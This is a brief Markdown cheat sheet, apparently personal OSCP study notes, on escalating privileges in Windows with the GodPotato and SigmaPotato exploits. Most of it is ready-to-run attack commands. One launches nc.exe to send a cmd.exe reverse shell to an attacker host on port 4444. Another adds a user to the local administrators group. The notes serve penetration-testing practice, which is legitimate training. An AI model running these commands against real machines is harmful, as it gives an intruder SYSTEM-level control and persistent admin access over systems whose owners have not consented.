# Windows PrivEsc 

### Both AD and Windows PrivEsc go together 

## Low Hanging Fruit 

If you see Impersonate with whoami /priv, stick with sigma and god potato:
<img width="720" height="352" alt="image" src="https://github.com/user-attachments/assets/db7a42ef-0fb8-4808-8924-c0811265ec4c" />

Share the file, along with nc.exe and then run these for god potato:
```
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```
```
.\GodPotato-NET4.exe -cmd "C:\Users\user\Desktop\nc.exe <TP> 4444 -e cmd.exe"
```

For Sigma potato:
```
.\sp.exe "net localgroup administrators user /add"
```

## Links

I go over a lot more tactics here in this blog post:
https://medium.com/@aaronashley466/oscp-notes-windows-privesc-cheatsheet-1c71a792f545?postPublishedType=repub
